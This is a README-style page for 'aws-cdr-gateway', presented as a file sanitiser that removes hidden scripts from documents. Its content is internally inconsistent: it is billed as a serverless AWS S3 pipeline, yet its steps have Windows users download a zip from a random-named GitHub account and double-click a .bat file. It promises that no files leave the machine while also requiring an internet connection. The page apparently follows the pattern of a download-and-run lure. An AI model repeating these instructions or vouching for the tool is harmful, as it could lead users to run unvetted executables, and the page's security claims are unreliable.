---
layout: "default"
title: "🛡️ aws-cdr-gateway - Remove malicious content from your files"
description: "Sanitize S3 file uploads with a serverless CDR pipeline that strips active threats and routes files to secure buckets."
---
# 🛡️ aws-cdr-gateway - Remove malicious content from your files

[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/melittasprawly975/aws-cdr-gateway)

## 📁 What is this application?

The aws-cdr-gateway acts as a filter for your files. It scans Office documents, PDFs, and images. It removes hidden scripts or harmful code. This process keeps your computer safe from cyber threats. You can run this tool on your local Windows machine using a simple interface.

## ⚙️ System requirements

Ensure your computer meets these needs before you start:

*   Windows 10 or Windows 11.
*   4 GB of system memory.
*   200 MB of free storage space.
*   A stable internet connection.
*   Python 3.9 or newer installed on your machine.

## 🚀 How to set up the software

Follow these steps to prepare your computer for the application:

1. Visit [this page](https://github.com/melittasprawly975/aws-cdr-gateway) to download the package.
2. Choose the latest version ending in .zip.
3. Save the file to your Downloads folder.
4. Right-click the folder and select Extract All.
5. Choose a destination folder on your desktop.
6. Open the folder to view the contents.

## 🖥️ Running the application

Use these steps to start the service:

1. Open the folder you extracted.
2. Locate the file named start_gateway.bat.
3. Double-click this file to launch the interface.
4. A black window appears on your screen. Keep this window open while you use the tool.
5. Open your web browser.
6. Type http://127.0.0.1:8000 into the address bar and press Enter.

## 📂 Processing your files

The browser interface provides a simple way to sanitize your documents:

1. Click the button labeled Upload File.
2. Select the document or image you want to clean.
3. Click the Process button.
4. The service removes hidden threats from the file.
5. The page alerts you when the file is ready.
6. Click the Download button to save your clean document.

## 🔍 How this tool protects you

Modern files often contain active content. This content can trigger programs without your permission. The aws-cdr-gateway engine looks at the structure of your file. It discards parts that do not belong in a standard document. It keeps the text and images while stripping out the executable parts. This gives you a safe version of your document.

## 🛠️ Configuration details

You do not need to change settings for basic use. The program uses default values that work for most users. If you need to change the output folder, find the config.yaml file in the app folder. Open it with Notepad. Change the path string to your preferred folder. Save the file and restart the application.

## ❓ Frequently asked questions

### Does this tool send my files to the cloud?
The local version runs entirely on your machine. No files leave your computer during the sanitization process.

### Can I process multiple files at once?
The current interface handles one file per upload. You can upload another file as soon as the first one finishes.

### Is the tool compatible with older Office files?
Yes. The engine handles legacy formats and modern formats without issue.

### What happens if a file is too large?
Large files may take more time to process. The status bar shows the progress of the operation.

## 💡 Support

If you encounter issues, check if the black window shows any red text. Copy the text and search for it in the help section of the website. Ensure your internet connection is active if you attempt to connect the gateway to your AWS accounts. Check that your Python installation is complete if the program refuses to start.